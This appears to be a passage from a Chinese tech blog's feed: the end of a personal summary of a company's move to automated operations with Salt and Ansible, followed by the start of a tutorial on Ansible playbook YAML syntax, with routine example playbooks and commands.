&lt;h4 id=&quot;2016年9月份公司架构演变从传统架构更换dubbo架构。&quot;&gt;&lt;a href=&quot;#2016年9月份公司架构演变从传统架构更换dubbo架构。&quot; class=&quot;headerlink&quot; title=&quot;2016年9月份公司架构演变从传统架构更换dubbo架构。&quot;&gt;&lt;/a&gt;2016年9月份公司架构演变从传统架构更换dubbo架构。&lt;/h4&gt;&lt;p&gt;公司应用服务架构图这里贴出来：&lt;a href=&quot;http://shiyanjun.cn/archives/325.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dubbo架构设计详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/jiagoutu2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;系统架构图这里我后期在更新贴出来。&lt;/p&gt;
&lt;h4 id=&quot;2017年3月份-公司服务器150台服务自动化发布。&quot;&gt;&lt;a href=&quot;#2017年3月份-公司服务器150台服务自动化发布。&quot; class=&quot;headerlink&quot; title=&quot;2017年3月份 公司服务器150台服务自动化发布。&quot;&gt;&lt;/a&gt;2017年3月份 公司服务器150台服务自动化发布。&lt;/h4&gt;&lt;p&gt;后面运维开发开发了一套基于salt自动化一套web版的管理平台。对我们后面的做部署初始化的确减轻了很多。&lt;br&gt;现在开始公司用的是ansible基python开发出来一套自动化部署的。发布部署测试一体系：&lt;br&gt;刚开发出来的截了一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/zidonhua1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;个人总结：&quot;&gt;&lt;a href=&quot;#个人总结：&quot; class=&quot;headerlink&quot; title=&quot;个人总结：&quot;&gt;&lt;/a&gt;个人总结：&lt;/h2&gt;&lt;h4 id=&quot;系统标准化：&quot;&gt;&lt;a href=&quot;#系统标准化：&quot; class=&quot;headerlink&quot; title=&quot;系统标准化：&quot;&gt;&lt;/a&gt;系统标准化：&lt;/h4&gt;&lt;p&gt;要想自动化，首先第一就是标准化。比如软件的&lt;code&gt;安装位置、版本、脚本，注册&lt;/code&gt;到init.d下面，这些应该是标准的，所有服务器都统一的。或者说你使用salt就是为了达到这样的标准化做自动化运维要经历的标准化–&amp;gt;&amp;gt;自动化—-&amp;gt;&amp;gt;服务化—-&amp;gt;&amp;gt;数据化。&lt;/p&gt;
&lt;h4 id=&quot;个人意见：&quot;&gt;&lt;a href=&quot;#个人意见：&quot; class=&quot;headerlink&quot; title=&quot;个人意见：&quot;&gt;&lt;/a&gt;个人意见：&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;只有标准了，才能自动，至少你相同的业务都应该是一样的。&lt;/li&gt;
&lt;li&gt;自动化，这个自动化讲的是工具，所有的操作是工具再做，不是人。也有小公司说我们半自动，的确是有的，就写写脚本然后靠工具去管理。&lt;/li&gt;
&lt;li&gt;服务化，你平台搞的很牛逼了，直接给业务提供接口。DNS、负载均衡、分布式存储、你都封装好了，上层不需要关心，你相当于为上层服务提供服务。各种API都写好了。&lt;/li&gt;
&lt;li&gt;数据化，或者说可视化，运维平台做的很牛逼，直接对业务负责，以业务为导向，今天订单量减少了，通过你的运维平台，直接定位问题，不需要各种查找，因为订单量的减少，肯定有相关的监控指标发生变化。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么在工具自动化建设的开始，你需要有一个理论支持，比如ITIL。不能瞎搞。没有流程的自动化运维就是耍流氓如果上线没有走上线流程，动不动，开发自己登录服务器执行了git pull。那还自动化什么呢。&lt;/p&gt;
&lt;p&gt;我个人的概念就是生产就是咱们运维的地盘。谁都不能动。开发想动，你可以提供接口，或者提供平台让开发点点鼠标就可以了。&lt;/p&gt;
&lt;h4 id=&quot;题外话：&quot;&gt;&lt;a href=&quot;#题外话：&quot; class=&quot;headerlink&quot; title=&quot;题外话：&quot;&gt;&lt;/a&gt;题外话：&lt;/h4&gt;&lt;p&gt;说个很蛋疼的事情，之前刚来这边负责创业公司运维岗位，技术团队开发人员都可以随便要权限，然后解决问题运维不用参与都是开发去操作。所以后来我进那家创业公司之间权限这些都是避免了。统一管理，统一分配，不同部门，不同岗位，不同权限。 这里我写过一篇文章：&lt;code&gt;中小公司员工统一用户认证方案&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个是自动化里面最常见的部署自动化，对于ITIL的流程就是发布与部署管理。&lt;br&gt;&lt;code&gt;构建---打包---测试---发布&lt;/code&gt;都需要是自动的；所以这块需要测试的支持。需要有自动化测试。没有就卡到测试了。&lt;br&gt;最简单的就是发布流程和开发流程分开。&lt;/p&gt;
&lt;p&gt;自动化运维减轻了很多的事情，也让更多的运维小伙伴可以研究更多的知识。&lt;br&gt;这篇文章也是自己对这两年多运维的这一方面的自动化运维的总结。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;运维自动化个人总结-记录自己自动化运维技术提升👍&quot;&gt;&lt;a href=&quot;#运维自动化个人总结-记录自己自动化运维技术提升👍&quot; class=&quot;headerlink&quot; title=&quot;运维自动化个人总结-记录自己自动化运维技术提升👍&quot;&gt;&lt;/a&gt;运维自动化个人总结-记
    
    </summary>
    
      <category term="automation" scheme="http://blog.yangcvo.me/categories/automation/"/>
    
    
      <category term="Automation" scheme="http://blog.yangcvo.me/tags/Automation/"/>
    
  </entry>
  
  <entry>
    <title>Ansible-Playbook高级语法运用</title>
    <link href="http://blog.yangcvo.me/2017/02/10/%E8%87%AA%E5%8A%A8%E5%8C%96+%E5%8F%AF%E8%A7%86%E5%8C%96/Ansible/Ansible-Playbook%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E8%BF%90%E7%94%A8/"/>
    <id>http://blog.yangcvo.me/2017/02/10/自动化+可视化/Ansible/Ansible-Playbook高级语法运用/</id>
    <published>2017-02-10T09:56:03.000Z</published>
    <updated>2017-03-23T14:52:47.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;Ansible-官网学习：&quot;&gt;&lt;a href=&quot;#Ansible-官网学习：&quot; class=&quot;headerlink&quot; title=&quot;Ansible 官网学习：&quot;&gt;&lt;/a&gt;Ansible 官网学习：&lt;/h3&gt;&lt;p&gt;免费下载的ANSIBLE WHITEPAPER  &lt;a href=&quot;https://www.ansible.com/ansible-in-depth-whitepaper&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ansible高级白皮书&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ansible简介, &lt;a href=&quot;https://fast.wistia.net/embed/iframe/p1oo1n6jtv?popover=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;111分钟的学习视频官网&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ansible自动化平台演示,&lt;a href=&quot;https://fast.wistia.net/embed/iframe/xi5453qdhl?popover=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;演示&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;我在官网学习📚书籍-，这里也是官网推荐我贴了3本，需要自己去下载：&quot;&gt;&lt;a href=&quot;#我在官网学习📚书籍-，这里也是官网推荐我贴了3本，需要自己去下载：&quot; class=&quot;headerlink&quot; title=&quot;我在官网学习📚书籍 ，这里也是官网推荐我贴了3本，需要自己去下载：&quot;&gt;&lt;/a&gt;我在官网学习📚书籍 ，这里也是官网推荐我贴了3本，需要自己去下载：&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;Ansible for DevOps, by Jeff Geerling&lt;br&gt;&lt;a href=&quot;https://www.ansible.com/ansible-devops-book&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FREE BOOK SAMPLE&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Extending Ansible eBook Preview , Extending Ansible  ,by Rishabh Das&lt;br&gt;&lt;a href=&quot;https://www.ansible.com/extending-ansible&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FREE BOOK SAMPLE&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Mastering Ansible ebook , Mastering Ansible , by Jesse Keating&lt;br&gt;&lt;a href=&quot;https://www.ansible.com/mastering-ansible-jesse-keating&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FREE BOOK SAMPLE&lt;/a&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里我主要应用到&lt;code&gt;Ansible-Playbook&lt;/code&gt; 比较多，一开始学ansible是因为运维这块需要用到自动化，以前自动化发布等等都是用shell,python复杂性的去完成，shell去实现部署一个环境，要完成多台机器之前采用，salt去实现效果，发现在公司一个大型的架构演变salt支撑不了，而且需要网络稳定性高，他们的自动化控制是用agent去控制的，需要控制的机器都要修改和配置安装agent,ansbile就不需要。&lt;/p&gt;
&lt;p&gt;在Ansible中，我们就充当编剧的角色，亲自编写剧本（一系列的服务器操作），让一出出精彩的戏剧（play）巧妙配合，完成对服务器的一系列精确控制。&lt;/p&gt;
&lt;h3 id=&quot;1-1-Playbook语法简介&quot;&gt;&lt;a href=&quot;#1-1-Playbook语法简介&quot; class=&quot;headerlink&quot; title=&quot;1.1 Playbook语法简介&quot;&gt;&lt;/a&gt;1.1 Playbook语法简介&lt;/h3&gt;&lt;p&gt;Playbook采用一种可读性很高的且容易被人类阅读的语法的YAML语法编写，&lt;code&gt;YAML: &amp;quot;YAML Ain&amp;#39;t a Markup Language&amp;quot;&lt;/code&gt;（YAML不是一种置标语言）。该语言在被开发时，YAML 的意思其实是：”Yet Another Markup Language”（仍是一种置标语言），格式如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;house:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  family:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    name: Doe&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    parents:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - John&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Jane&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    children:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Paul&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Mark&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Simone&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  address:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    number: 34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    street: Main Street&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    city: Nowheretown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  zipcode: 12345&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里语法报错有的如果按shell脚本直接去写的话就会出错：&lt;/p&gt;
&lt;p&gt;报错： &lt;code&gt;[WARNING]: Consider using unarchive module rather than running unzip&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ansible_01 ~]&lt;span class=&quot;comment&quot;&gt;# ansible-playbook famly.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PLAY [all] *********************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TASK [setup] *******************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ok: [192.168.1.209]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TASK [copy-war-file] ***********************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ok: [192.168.1.209]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TASK [unzip war.] **************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;changed: [192.168.1.209]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; [WARNING]: Consider using unarchive module rather than running unzip&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PLAY RECAP *********************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192.168.1.209              : ok=3    changed=1    unreachable=0    failed=0&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;原这里famly.yml写这里解压步骤：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- name : 解压/root/java_war/api.war包在/home/app/newwar/api目录&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   shell : unzip -oq &amp;#123;&amp;#123; famly_war &amp;#125;&amp;#125;  &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &amp;#123;&amp;#123; app_war &amp;#125;&amp;#125;/webapps/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改以后：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- name: unzip war.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  unarchive: src=/root/java_war/haozhuo-family.war dest=/srv/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;经过以上更改后，软件包可以正常在client解压，不再报错。&lt;/p&gt;
&lt;h3 id=&quot;2、特点&quot;&gt;&lt;a href=&quot;#2、特点&quot; class=&quot;headerlink&quot; title=&quot;2、特点&quot;&gt;&lt;/a&gt;2、特点&lt;/h3&gt;&lt;p&gt;YAML的可读性好&lt;/p&gt;
&lt;p&gt;YAML和脚本语言的交互性好&lt;/p&gt;
&lt;p&gt;YAML使用实现语言的数据类型&lt;/p&gt;
&lt;p&gt;YAML有一个一致的信息模型&lt;/p&gt;
&lt;p&gt;YAML易于实现&lt;/p&gt;
&lt;p&gt;YAML可以基于流来处理&lt;/p&gt;
&lt;p&gt;YAML表达能力强，扩展性好&lt;/p&gt;
&lt;p&gt;YAML的语法和其他高阶语言类似，并且可以简单表达清单、散列表、标量等数据结构。其结构（Structure）通过空格来展示，序列（Sequence）里的项用”-“来代表，Map里的键值对用”:”分隔。下面是一个示例。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- hosts: 10.1.0.1        &lt;span class=&quot;comment&quot;&gt;#定义主机&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:                      &lt;span class=&quot;comment&quot;&gt;#定义变量&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       var1: value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       var2: value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:                    &lt;span class=&quot;comment&quot;&gt;#定义任务&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       - name:           &lt;span class=&quot;comment&quot;&gt;#任务名称。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;#这里就可以开始用模块来执行具体的任务了。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  handlers:     &lt;span class=&quot;comment&quot;&gt;#定义触发通知所作的操作。里面也是跟tasks一样，用模块定义任务。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       - name:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  remote_user:             &lt;span class=&quot;comment&quot;&gt;#远程主机执行任务时的用户。一般都是root，一般也不用指定。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- hosts: web&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  handlers:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  remote_user:&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;YAML文件扩展名通常为&lt;code&gt;.yaml，如family.yaml&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-playbook的基础组件：&quot;&gt;&lt;a href=&quot;#2-playbook的基础组件：&quot; class=&quot;headerlink&quot; title=&quot;2.playbook的基础组件：&quot;&gt;&lt;/a&gt;2.playbook的基础组件：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Hosts：运行指定任务的目标主机；&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remote_user：在远程主机以哪个用户身份执行；&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sudo_user：非管理员需要拥有sudo权限；&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tasks：任务列表&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    模块，模块参数：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        格式：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            (1) action: module arguments&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            (2) module: arguments&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;示例1：&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ansible_23.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;vim test.yaml 也可以是 .yml&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- hosts: tomcat_01   &lt;span class=&quot;comment&quot;&gt;#运行指定任务的目标主机；&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  remote_user: root   &lt;span class=&quot;comment&quot;&gt;#在远程主机以哪个用户身份执行；root&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: install a group   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   group: name=mygrp system=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: install a user&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    user: name=user1 group=mygrp system=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;# 这里-name: graoup: 都要对齐，不然会提示语法出错。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; - hosts: websrvs      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   remote_user: root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - name: install httpd package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      yum: name=httpd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - name: start httpd service &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      service: name=httpd state=started&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-运行playbook，使用ansible-playbook命令&quot;&gt;&lt;a href=&quot;#3-运行playbook，使用ansible-playbook命令&quot; class=&quot;headerlink&quot; title=&quot;3.运行playbook，使用ansible-playbook命令&quot;&gt;&lt;/a&gt;3.运行playbook，使用ansible-playbook命令&lt;/h3&gt;&lt;p&gt;(1)检测语法&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ansible-playbook –syntax-check /path/to/playbook.yaml&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(2)测试运行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ansible-playbook -C /path/to/playbook.yaml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    --list-hosts&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    --list-tasks&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    --list-tags&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里简单结合shell演变写安装nginx:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div 